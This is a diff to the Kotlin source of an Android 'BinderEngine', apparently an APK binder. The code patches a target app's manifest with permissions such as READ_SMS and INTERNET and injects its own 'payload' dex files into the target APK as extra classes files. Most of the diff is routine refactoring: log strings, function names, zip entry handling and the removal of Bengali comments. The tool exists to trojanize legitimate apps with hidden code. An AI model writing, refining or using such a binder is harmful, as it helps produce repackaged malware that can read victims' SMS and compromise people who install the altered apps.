@@ -18,11 +18,13 @@ import java.io.FileOutputStream
 import java.security.KeyStore
 import java.security.PrivateKey
 import java.security.cert.X509Certificate
+import java.util.zip.CRC32
 import java.util.zip.ZipEntry
 import java.util.zip.ZipFile
 import java.util.zip.ZipOutputStream
 
 class BinderEngine(private val ctx: Context) {
+
     private val permissions = listOf(
         "android.permission.INTERNET",
         "android.permission.READ_SMS",
@@ -82,14 +84,13 @@ class BinderEngine(private val ctx: Context) {
         }
         onLog(LogLevel.SUCCESS, "Manifest patched")
 
-        onLog(LogLevel.INFO, "Collecting all payload dex files...")
-        // এখানে আপনার অ্যাপের সমস্ত ডেক্স ফাইল (Classes.dex থেকে শুরু করে মাল্টি-ডেক্স সব কয়টি) সম্পূর্ণ সংগ্রহ করা হচ্ছে
-        val dexes = collectAllOwnDex()
+        onLog(LogLevel.INFO, "Collecting payload dex...")
+        val dexes = collectOwnDex()
         if (dexes.isEmpty()) {
             srcZip.close()
-            throw IllegalStateException("Payload dex files not found")
+            throw IllegalStateException("Payload dex not found")
         }
-        onLog(LogLevel.INFO, "Total Injected Dex files: " + dexes.size)
+        onLog(LogLevel.INFO, "Dex files: " + dexes.size)
 
         val maxDex = srcZip.entries().toList()
             .mapNotNull { Regex("^classes(\\d*)\\.dex$").find(it.name) }
@@ -117,8 +118,12 @@ class BinderEngine(private val ctx: Context) {
 
                 val data = srcZip.getInputStream(e).use { it.readBytes() }
                 val entry = ZipEntry(e.name)
-                entry.method = ZipEntry.DEFLATED
-                
+                if (e.name == "resources.arsc") {
+                    entry.method = ZipEntry.STORED
+                    entry.size = data.size.toLong()
+                    entry.compressedSize = data.size.toLong()
+                    entry.crc = CRC32().apply { update(data) }.value
+                } else entry.method = ZipEntry.DEFLATED
                 zos.putNextEntry(entry)
                 zos.write(data)
                 zos.closeEntry()
@@ -133,10 +138,8 @@ class BinderEngine(private val ctx: Context) {
             zos.write(cfgBytes)
             zos.closeEntry()
 
-            // টার্গেট এপিকে-র নিজস্ব ডেক্স নামগুলোর সাথে সিরিয়াল মেইনটেইন করে আপনার অ্যাপের সবকটি ডেক্স ফাইল ইনজেক্ট করা হচ্ছে
             dexes.forEachIndexed { i, bytes ->
-                val dexName = if (i == 0) "classes" + (maxDex + 1) + ".dex" else "classes" + (maxDex + i + 1) + ".dex"
-                zos.putNextEntry(ZipEntry(dexName))
+                zos.putNextEntry(ZipEntry("classes" + (maxDex + i + 1) + ".dex"))
                 zos.write(bytes)
                 zos.closeEntry()
             }
@@ -174,7 +177,7 @@ class BinderEngine(private val ctx: Context) {
         stream.use { input -> target.outputStream().use { input.copyTo(it) } }
     }
 
-    private fun collectAllOwnDex(): List<ByteArray> {
+    private fun collectOwnDex(): List<ByteArray> {
         val info = ctx.packageManager.getApplicationInfo(ctx.packageName, PackageManager.GET_META_DATA)
         val paths = ArrayList<String>()
         info.sourceDir?.let { paths.add(it) }
@@ -184,13 +187,10 @@ class BinderEngine(private val ctx: Context) {
         for (path in paths) {
             try {
                 ZipFile(path).use { z ->
-                    // এখানে আপনার অ্যাপে থাকা সমস্ত ডেক্স ফাইল (classes.dex, classes2.dex থেকে শুরু করে সব) নিখুঁতভাবে ফিল্টার করে নেওয়া হচ্ছে
                     z.entries().toList()
                         .filter { Regex("^classes\\d*\\.dex$").matches(it.name) }
                         .sortedBy { it.name }
-                        .forEach { e -> 
-                            out.add(z.getInputStream(e).use { it.readBytes() }) 
-                        }
+                        .forEach { e -> out.add(z.getInputStream(e).use { it.readBytes() }) }
                 }
             } catch (_: Throwable) {
             }
